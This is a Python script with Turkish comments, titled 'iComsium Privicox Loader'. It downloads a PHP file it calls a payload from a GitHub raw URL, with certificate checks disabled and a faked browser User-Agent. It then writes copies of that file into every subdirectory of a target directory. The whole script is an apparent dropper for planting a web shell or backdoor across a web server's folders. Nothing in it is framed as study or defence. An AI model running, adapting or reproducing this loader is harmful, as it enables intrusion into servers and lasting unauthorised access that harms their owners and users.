#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import urllib.request
import sys
import ssl

# GitHub raw URL
PAYLOAD_URL = "https://raw.githubusercontent.com/iComsium/iComsium/refs/heads/master/privicox.php"
PAYLOAD_NAME = "privicox.php"


def download_payload(url=PAYLOAD_URL):
    """Payload'u GitHub'dan indir"""
    print(f"[*] Payload indiriliyor: {url}")
    try:
        # SSL sertifika doğrulamasını atla (bazı sunucularda sorun çıkabilir)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        req = urllib.request.Request(url, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        with urllib.request.urlopen(req, context=ctx, timeout=30) as response:
            content = response.read()
            print(f"[+] Payload indirildi ({len(content)} byte)")
            return content
    except Exception as e:
        print(f"[!] İndirme hatası: {e}")
        sys.exit(1)


def write_to_dirs(base_dir, content, file_name=PAYLOAD_NAME, recursive=True, max_depth=None):
    """
    Belirtilen dizindeki tüm alt dizinlere dosyayı yaz.
    
    Args:
        base_dir: Başlangıç dizini
        content: Yazılacak içerik (bytes)
        file_name: Dosya adı
        recursive: Alt dizinlere de yazılsın mı
        max_depth: Maksimum derinlik (None = sınırsız)
    """
    base_dir = os.path.abspath(base_dir)
    
    if not os.path.exists(base_dir):
        print(f"[!] Bulunamadı: {base_dir}")
        return 0
    
    if not os.path.isdir(base_dir):
        print(f"[!] Dizin değil: {base_dir}")
        return 0
    
    print(f"[*] Hedef dizin: {base_dir}")
    print(f"[*] Dosya adı: {file_name}")
    print(f"[*] Recursive: {recursive}")
    print("-" * 60)
    
    success_count = 0
    error_count = 0
    
    try:
        # os.walk ile tüm alt dizinleri gez
        if recursive:
            for root, dirs, files in os.walk(base_dir):
                # Derinlik kontrolü
                if max_depth is not None:
                    depth = root[len(base_dir):].count(os.sep)
                    if depth > max_depth:
                        dirs[:] = []  # Daha derine inme
                        continue
                
                # Bu dizine yaz
                target = os.path.join(root, file_name)
                try:
                    with open(target, 'wb') as f:
                        f.write(content)
                    print(f"[+] YAZILDI: {target}")
                    success_count += 1
                except PermissionError:
                    print(f"[!] İZİN YOK: {target}")
                    error_count += 1
                except Exception as e:
                    print(f"[!] HATA: {target} - {e}")
                    error_count += 1
        else:
            # Sadece base_dir içindeki alt dizinlere yaz (orijinal PHP gibi)
            for entry in os.listdir(base_dir):
                full_path = os.path.join(base_dir, entry)
                if os.path.isdir(full_path):
                    target = os.path.join(full_path, file_name)
                    try:
                        with open(target, 'wb') as f:
                            f.write(content)
                        print(f"[+] YAZILDI: {target}")
                        success_count += 1
                    except PermissionError:
                        print(f"[!] İZİN YOK: {target}")
                        error_count += 1
                    except Exception as e:
                        print(f"[!] HATA: {target} - {e}")
                        error_count += 1
    except Exception as e:
        print(f"[!] Genel hata: {e}")
    
    print("-" * 60)
    print(f"[*] Toplam: {success_count} başarılı, {error_count} hatalı")
    return success_count


def main():
    print("=" * 60)
    print("  iComsium Privicox Loader")
    print("=" * 60)
    
    # Payload'u indir
    payload_content = download_payload()
    
    # Hedef dizini belirle
    if len(sys.argv) > 1:
        base_dir = sys.argv[1]
    else:
        base_dir = os.getcwd()
    
    # Recursive seçeneği
    recursive = True
    if len(sys.argv) > 2:
        recursive = sys.argv[2].lower() in ('true', '1', 'yes', 'r')
    
    # Maksimum derinlik (opsiyonel)
    max_depth = None
    if len(sys.argv) > 3:
        try:
            max_depth = int(sys.argv[3])
        except ValueError:
            pass
    
    # Yaz
    write_to_dirs(
        base_dir=base_dir,
        content=payload_content,
        file_name=PAYLOAD_NAME,
        recursive=recursive,
        max_depth=max_depth
    )


if __name__ == '__main__':
    main()